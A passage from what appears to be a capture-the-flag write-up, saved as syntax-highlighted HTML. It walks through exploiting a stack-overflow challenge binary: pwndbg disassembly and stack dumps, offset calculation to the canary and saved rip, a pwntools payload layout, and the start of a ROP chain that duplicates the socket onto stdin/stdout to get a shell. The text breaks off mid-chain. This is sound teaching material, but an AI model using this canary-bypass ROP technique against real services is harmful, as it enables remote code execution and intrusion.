style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">PTR</span><span style="--0:#24292E;--1:#E1E4E8"> [rbp-0x13c]</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x000000000000151c</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+595&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">mov</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">ecx,0x0</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x0000000000001521</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+600&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">mov</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">edi,eax</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x0000000000001523</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+602&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">call</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#005CC5;--1:#79B8FF">0x1150</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;send@plt&gt;</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x0000000000001528</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+607&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">jmp</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#005CC5;--1:#79B8FF">0x149e</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;main+469&gt;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#005CC5;--1:#79B8FF">..</span><span style="--0:#032F62;--1:#9ECBFF">.SNIP.</span><span style="--0:#005CC5;--1:#79B8FF">..</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">b</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">*</span><span style="--0:#032F62;--1:#9ECBFF">main+567</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Breakpoint</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">at</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0x1500</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">r</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Starting</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">program:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">/home/kali/blackhat-finals/stack-prelude/chall</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">warning:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Expected</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">absolute</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">pathname</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">for</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">libpthread</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">in</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">the</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">inferior,</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">but</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">got</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./libc.so.6.warning:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Unable</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">to</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">find</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">libthread_db</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">matching</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">inferior&#39;s thread library, thread debugging will not be available.Breakpoint 1, 0x0000555555555500 in main ()</span></div></div><div class="ec-line"><div class="code"><span style="--0:#032F62;--1:#9ECBFF">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"><span style="--0:#032F62;--1:#9ECBFF"> </span></span><span style="--0:#032F62;--1:#9ECBFF">► 0x555555555500 &lt;main+567&gt;    call   recv@plt                    &lt;recv@plt&gt;</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="code"><span class="indent"><span style="--0:#032F62;--1:#9ECBFF">        </span></span><span style="--0:#032F62;--1:#9ECBFF">fd: 4 (socket:[23889025])</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="code"><span class="indent"><span style="--0:#032F62;--1:#9ECBFF">        </span></span><span style="--0:#032F62;--1:#9ECBFF">buf: 0x7fffffffdb40 ◂— 0x20f9</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="code"><span class="indent"><span style="--0:#032F62;--1:#9ECBFF">        </span></span><span style="--0:#032F62;--1:#9ECBFF">n: 0x1ff</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="code"><span class="indent"><span style="--0:#032F62;--1:#9ECBFF">        </span></span><span style="--0:#032F62;--1:#9ECBFF">flags: 0x100</span></div></div><div class="ec-line"><div class="code"><span style="--0:#032F62;--1:#9ECBFF">...SNIP...</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ gdb -q ./chall...SNIP...pwndbg> disas mainDump of assembler code for function main:   0x00000000000012c9 <+0>:     endbr64...SNIP...   0x00000000000014f9 <+560>:   mov    ecx,0x100   0x00000000000014fe <+565>:   mov    edi,eax   0x0000000000001500 <+567>:   call   0x1110 <recv@plt>   0x0000000000001505 <+572>:   mov    rax,QWORD PTR [rbp-0x138]   0x000000000000150c <+579>:   mov    rdx,rax   0x000000000000150f <+582>:   lea    rsi,[rbp-0x110]   0x0000000000001516 <+589>:   mov    eax,DWORD PTR [rbp-0x13c]   0x000000000000151c <+595>:   mov    ecx,0x0   0x0000000000001521 <+600>:   mov    edi,eax   0x0000000000001523 <+602>:   call   0x1150 <send@plt>   0x0000000000001528 <+607>:   jmp    0x149e <main+469>...SNIP...pwndbg> b *main+567Breakpoint 1 at 0x1500pwndbg> rStarting program: /home/kali/blackhat-finals/stack-prelude/chall warning: Expected absolute pathname for libpthread in the inferior, but got ./libc.so.6.warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.Breakpoint 1, 0x0000555555555500 in main ()...SNIP... ► 0x555555555500 <main+567>    call   recv@plt                    <recv@plt>        fd: 4 (socket:[23889025])        buf: 0x7fffffffdb40 ◂— 0x20f9        n: 0x1ff        flags: 0x100...SNIP..."><div></div></button></div></figure></div>
<p>We can see that our input starts at 0x7fffffffdb40. Now let’s look at the distance of rip and the canary from our input:</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:64ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">dq</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0x7fffffffdb40</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">100</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdb40</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#032F62;--1:#9ECBFF">00000000000020f9</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0000000000000002</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdb50</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">0000000000000000</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">00007fffffffdc18</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdb60</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#032F62;--1:#9ECBFF">00007fffffffdc60</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">00007ffff7fdeddb</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdb70</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">0000000000000004</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0000000000000040</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdb80</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">0000000000300000</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">000000000000000c</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdb90</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#032F62;--1:#9ECBFF">ffffffffffffffff</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0000000000000040</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdba0</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">0000000000000008</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0000000000120000</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdbb0</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">0000000000000800</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0000000000120000</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdbc0</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">0000000000008000</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0000000000300000</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdbd0</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">0000000000300000</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0000000000040000</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdbe0</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">0000000000008000</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">00007fffffffdc18</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdbf0</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#032F62;--1:#9ECBFF">0000008e00000006</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0000000000000000</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc00</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">0000000000000000</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0000000000000000</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc10</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">0000000000000000</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0000000000000000</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc20</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">0000000000000000</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0000000000000000</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc30</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">0000000000000000</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">00007ffff7fe5af0</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc40</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#032F62;--1:#9ECBFF">00007fffffffdd30</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ad624fce49a85800</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc50</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#032F62;--1:#9ECBFF">00007fffffffdcf0</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">00007ffff7c2a1ca</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc60</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#032F62;--1:#9ECBFF">00007fffffffdca0</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">00007fffffffdd78</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc70</span><span style="--0:#24292E;--1:#E1E4E8">     </span><span style="--0:#005CC5;--1:#79B8FF">0000000155554040</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">00005555555552c9</span></div></div><div class="ec-line"><div class="code"><span style="--0:#005CC5;--1:#79B8FF">..</span><span style="--0:#032F62;--1:#9ECBFF">.SNIP.</span><span style="--0:#005CC5;--1:#79B8FF">..</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">i</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">f</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Stack</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">level</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">0,</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">frame</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">at</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">0x7fffffffdc60:</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">rip</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0x555555555500</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">in</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">main</span><span style="--0:#24292E;--1:#E1E4E8">; </span><span style="--0:#6F42C1;--1:#B392F0">saved</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">rip</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0x7ffff7c2a1ca</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">called</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">by</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">frame</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">at</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0x7fffffffdd00</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">Arglist</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">at</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">0x7fffffffdc50,</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">args:</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">Locals</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">at</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">0x7fffffffdc50,</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Previous</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">frame&#39;s sp is 0x7fffffffdc60</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"><span style="--0:#032F62;--1:#9ECBFF"> </span></span><span style="--0:#032F62;--1:#9ECBFF">Saved registers:</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="code"><span class="indent"><span style="--0:#032F62;--1:#9ECBFF">  </span></span><span style="--0:#032F62;--1:#9ECBFF">rbp at 0x7fffffffdc50, rip at 0x7fffffffdc58</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> dq 0x7fffffffdb40 10000007fffffffdb40     00000000000020f9 000000000000000200007fffffffdb50     0000000000000000 00007fffffffdc1800007fffffffdb60     00007fffffffdc60 00007ffff7fdeddb00007fffffffdb70     0000000000000004 000000000000004000007fffffffdb80     0000000000300000 000000000000000c00007fffffffdb90     ffffffffffffffff 000000000000004000007fffffffdba0     0000000000000008 000000000012000000007fffffffdbb0     0000000000000800 000000000012000000007fffffffdbc0     0000000000008000 000000000030000000007fffffffdbd0     0000000000300000 000000000004000000007fffffffdbe0     0000000000008000 00007fffffffdc1800007fffffffdbf0     0000008e00000006 000000000000000000007fffffffdc00     0000000000000000 000000000000000000007fffffffdc10     0000000000000000 000000000000000000007fffffffdc20     0000000000000000 000000000000000000007fffffffdc30     0000000000000000 00007ffff7fe5af000007fffffffdc40     00007fffffffdd30 ad624fce49a8580000007fffffffdc50     00007fffffffdcf0 00007ffff7c2a1ca00007fffffffdc60     00007fffffffdca0 00007fffffffdd7800007fffffffdc70     0000000155554040 00005555555552c9...SNIP...pwndbg> i fStack level 0, frame at 0x7fffffffdc60: rip = 0x555555555500 in main; saved rip = 0x7ffff7c2a1ca called by frame at 0x7fffffffdd00 Arglist at 0x7fffffffdc50, args: Locals at 0x7fffffffdc50, Previous frame's sp is 0x7fffffffdc60 Saved registers:  rbp at 0x7fffffffdc50, rip at 0x7fffffffdc58"><div></div></button></div></figure></div>
<p>The rip is at a <code>+0x118</code> offset from the start of our buffer, and the canary is at <code>-0x10</code> from rip.</p>
<p>So, our payload will look like this:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:38ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">payload = flat(</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">  </span></span><span style="--0:#24292e;--1:#e1e4e8">b&quot;A&quot;*0x100,                # buffer</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">  </span></span><span style="--0:#24292e;--1:#e1e4e8">p64(0),                    # padding</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">  </span></span><span style="--0:#24292e;--1:#e1e4e8">p64(canary),               # canary</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">  </span></span><span style="--0:#24292e;--1:#e1e4e8">p64(0),                    # rbp</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">  </span></span><span style="--0:#24292e;--1:#e1e4e8">rop                        # rip</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="payload = flat(  b&#34;A&#34;*0x100,                # buffer  p64(0),                    # padding  p64(canary),               # canary  p64(0),                    # rbp  rop                        # rip)"><div></div></button></div></figure></div>
<p>Now let’s write the rop chain that gives us a shell. First, we’ll duplicate stdout and stdin to the file descriptor of our connection so we can interact with the shell.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:49ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop  </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;&#39;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">&quot;&quot;&quot;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">libc.address + 0x10f78b : pop rdi ; ret</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">libc.address + 0x110a7d : pop rsi ; ret</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">dup(4, 1)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">dup(4, 0)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">https://man7.org/linux/man-pages/man2/dup2.2.html</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">&quot;&quot;&quot;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">10f78b</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(</span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">110a7d</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.sym.dup2)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">10f78b</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(</span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">110a7d</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span 